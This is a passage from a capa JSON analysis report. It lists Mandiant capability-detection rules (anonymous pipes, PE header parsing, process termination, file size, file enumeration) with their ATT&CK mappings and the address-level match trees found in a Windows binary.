        "source": "rule:\r\n  meta:\r\n    name: create two anonymous pipes\r\n    namespace: communication/named-pipe/create\r\n    authors:\r\n      - matthew.williams@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Communication::Interprocess Communication::Create Pipe [C0003.001]\r\n    examples:\r\n      - Practical Malware Analysis Lab 14-02.exe_:0x4011C0\r\n  features:\r\n    - and:\r\n      - count(api(CreatePipe)): 2\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442467776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 2,
                      "max": 2,
                      "child": {
                        "type": "api",
                        "api": "CreatePipe"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442467994
                    },
                    {
                      "type": "absolute",
                      "value": 6442467966
                    }
                  ],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "parse PE header": {
        "meta": {
          "name": "parse PE header",
          "namespace": "load-code/pe",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x403DD0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: parse PE header\r\n    namespace: load-code/pe\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires mnemonic, operand[1].offset features\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x403DD0\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - and:\r\n        - mnemonic: cmp\r\n        - or:\r\n          - number: 0x4550 = IMAGE_NT_SIGNATURE (PE)\r\n          - and:\r\n            - number: 0x50\r\n            - number: 0x45\r\n        - or:\r\n          - number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ)\r\n          - and:\r\n            - number: 0x4D\r\n            - number: 0x5A\r\n        - optional:\r\n          - and:\r\n            - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n            - or:\r\n              - and:\r\n                - arch: i386\r\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\r\n                - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n              - and:\r\n                - arch: amd64\r\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\r\n                - operand[1].offset: 0x30 = IMAGE_NT_HEADERS64.OptionalHeader.ImageBase\r\n          - basic block:\r\n            - and:\r\n              - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n              - 3 or more:\r\n                - operand[1].offset: 0x4 = IMAGE_NT_HEADERS.FileHeader.Machine\r\n                - operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections\r\n                - operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader\r\n                - operand[1].offset: 0x16 = IMAGE_NT_HEADERS.FileHeader.Characteristics\r\n                - operand[1].offset: 0x28 = IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint  # for 32 and 64 bit\r\n                - or:\r\n                  - and:\r\n                    - arch: i386\r\n                    - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\r\n                  - and:\r\n                    - arch: amd64\r\n                    - operand[1].offset: 0x30 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442591112
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "cmp"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442591284
                        },
                        {
                          "type": "absolute",
                          "value": 6442591207
                        },
                        {
                          "type": "absolute",
                          "value": 6442591192
                        },
                        {
                          "type": "absolute",
                          "value": 6442591179
                        },
                        {
                          "type": "absolute",
                          "value": 6442591198
                        },
                        {
                          "type": "absolute",
                          "value": 6442591167
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 17744,
                              "description": "IMAGE_NT_SIGNATURE (PE)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442591179
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 80
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442591125
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 69
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 23117,
                              "description": "IMAGE_DOS_SIGNATURE (MZ)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442591162
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 77
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 90
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 60,
                                  "description": "IMAGE_DOS_HEADER.e_lfanew"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442591172
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 52,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 48,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "parse PE header/3a0d016707f44fa5b41262f634a21c96"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442671504
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "cmp"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442671536
                        },
                        {
                          "type": "absolute",
                          "value": 6442671521
                        },
                        {
                          "type": "absolute",
                          "value": 6442671509
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 17744,
                              "description": "IMAGE_NT_SIGNATURE (PE)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442671521
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 80
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 69
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 23117,
                              "description": "IMAGE_DOS_SIGNATURE (MZ)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442671504
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 77
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 90
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 60,
                                  "description": "IMAGE_DOS_HEADER.e_lfanew"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442671514
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 52,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 48,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "parse PE header/3a0d016707f44fa5b41262f634a21c96"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "terminate process": {
        "meta": {
          "name": "terminate process",
          "namespace": "host-interaction/process/terminate",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Terminate Process"
              ],
              "objective": "Process",
              "behavior": "Terminate Process",
              "method": "",
              "id": "C0018"
            }
          ],
          "references": [],
          "examples": [
            "C91887D861D9BD4A5872249B641BC9F9:0x401A77",
            "9B7CCAA2AE6A5B96E3110EBCBC4311F6:0x10010307"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: terminate process\r\n    namespace: host-interaction/process/terminate\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Process::Terminate Process [C0018]\r\n    examples:\r\n      - C91887D861D9BD4A5872249B641BC9F9:0x401A77\r\n      - 9B7CCAA2AE6A5B96E3110EBCBC4311F6:0x10010307\r\n  features:\r\n    - or:\r\n      - api: System.Diagnostics.Process::Kill\r\n      - api: System.Diagnostics.Process::WaitForExit\r\n      - api: System.Diagnostics.Process::WaitForExitAsync\r\n      - api: System.Environment::Exit\r\n      - api: System.Windows.Forms.Application::Exit\r\n      - api: exit\r\n      - api: Exit\r\n      - and:\r\n        - os: linux\r\n        - api: exit_group\r\n      - and:\r\n        - optional:\r\n          - match: open process\r\n        - or:\r\n          - api: kernel32.TerminateProcess\r\n          - api: ntdll.NtTerminateProcess\r\n          - api: kernel32.ExitProcess\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442591312
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Kill"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::WaitForExit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::WaitForExitAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Windows.Forms.Application::Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Exit"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "linux"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "exit_group"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "open process"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "TerminateProcess"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442591340
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtTerminateProcess"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ExitProcess"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442591355
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get file size": {
        "meta": {
          "name": "get file size",
          "namespace": "host-interaction/file-system/meta",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "tactic": "Discovery",
              "technique": "File and Directory Discovery",
              "subtechnique": "",
              "id": "T1083"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "objective": "Discovery",
              "behavior": "File and Directory Discovery",
              "method": "",
              "id": "E1083"
            }
          ],
          "references": [],
          "examples": [
            "mimikatz.exe_:0x40630D"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get file size\r\n    namespace: host-interaction/file-system/meta\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::File and Directory Discovery [T1083]\r\n    mbc:\r\n      - Discovery::File and Directory Discovery [E1083]\r\n    examples:\r\n      - mimikatz.exe_:0x40630D\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetFileSize\r\n      - api: kernel32.GetFileSizeEx\r\n      - property/read: System.IO.FileInfo::Length\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442615492
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetFileSize"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetFileSizeEx"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442615583
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.IO.FileInfo::Length"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "enumerate files on Windows": {
        "meta": {
          "name": "enumerate files on Windows",
          "namespace": "host-interaction/file-system/files/list",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "tactic": "Discovery",
              "technique": "File and Directory Discovery",
              "subtechnique": "",
              "id": "T1083"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "objective": "Discovery",
              "behavior": "File and Directory Discovery",
              "method": "",
              "id": "E1083"
            }
          ],
          "references": [
            "https://github.com/hfiref0x/TDL/blob/cc4b46ae1c939b14a22a734a727b163f873a41b5/Source/Furutaka/sup.c#L315"
          ],
          "examples": [
            "Practical Malware Analysis Lab 01-01.exe_:0x4011E0",
            "Practical Malware Analysis Lab 20-02.exe_:0x401000",
            "563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x14000203C"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: enumerate files on Windows\r\n    namespace: host-interaction/file-system/files/list\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    att&ck:\r\n      - Discovery::File and Directory Discovery [T1083]\r\n    mbc:\r\n      - Discovery::File and Directory Discovery [E1083]\r\n    references:\r\n      - https://github.com/hfiref0x/TDL/blob/cc4b46ae1c939b14a22a734a727b163f873a41b5/Source/Furutaka/sup.c#L315\r\n    examples:\r\n      - Practical Malware Analysis Lab 01-01.exe_:0x4011E0\r\n      - Practical Malware Analysis Lab 20-02.exe_:0x401000\r\n      - 563653399B82CD443F120ECEFF836EA3678D4CF11D9B351BB737573C2D856299:0x14000203C\r\n  features:\r\n    - or:\r\n      - and:\r\n        - or:\r\n          - api: kernel32.FindFirstFile\r\n          - api: kernel32.FindFirstFileEx\r\n          - api: kernel32.FindFirstFileTransacted\r\n          - api: kernel32.FindFirstFileName\r\n          - api: kernel32.FindFirstFileNameTransacted\r\n        - or:\r\n          - api: kernel32.FindNextFile\r\n          - api: kernel32.FindNextFileName\r\n        - optional:\r\n          - api: kernel32.FindClose\r\n          - match: contain loop\r\n      - and:\r\n        - or:\r\n          - basic block:\r\n            - and:\r\n              - number: 1 = DIRECTORY_QUERY\r\n              - api: ntdll.NtOpenDirectoryObject\r\n          - call:\r\n            - and:\r\n              - number: 1 = DIRECTORY_QUERY\r\n              - api: ntdll.NtOpenDirectoryObject\r\n        - api: ntdll.NtQueryDirectoryObject\r\n        - optional:\r\n          - api: RtlAllocateHeap\r\n          - match: contain loop\r\n          - characteristic: indirect call\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442634008
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "enumerate files on Windows/bfb3d9c59bd2482cb21937b6c58ce90c"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "enumerate files on Windows/e2bc3d8bf8ff40ca879bbbc9844866f8"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "NtQueryDirectoryObject"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RtlAllocateHeap"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "contain loop"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "loop"
